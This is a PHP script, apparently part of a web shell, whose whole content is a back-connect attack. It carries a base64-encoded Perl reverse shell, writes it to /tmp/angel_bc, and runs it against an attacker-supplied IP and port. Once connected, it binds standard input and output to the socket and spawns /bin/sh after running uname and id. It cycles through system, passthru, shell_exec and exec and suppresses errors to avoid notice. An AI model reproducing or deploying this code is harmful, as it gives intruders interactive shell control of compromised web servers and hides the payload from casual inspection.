<?php

$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
		"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
		"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
		"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
		"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
		"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
		"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
		
function execute($cfe) {
	$res = '';
	
	if(function_exists('system')) {
		@ob_start();
		@system($cfe);
		$res = @ob_get_contents();
		@ob_end_clean();
	} elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cfe);
		$res = @ob_get_contents();
		@ob_end_clean();
	} elseif(function_exists('shell_exec')) {
		$res = @shell_exec($cfe);
	} elseif(function_exists('exec')) {
		@exec($cfe,$res);
		$res = join("\n",$res);
	} 	
	return $res;
}
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr); 
}

function cf($fname,$text){
	if($fp=@fopen($fname,'w')) {
		@fputs($fp,@base64_decode($text));
		@fclose($fp);
	}
}

cf('/tmp/angel_bc',$back_connect);
$res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");

exit;
?>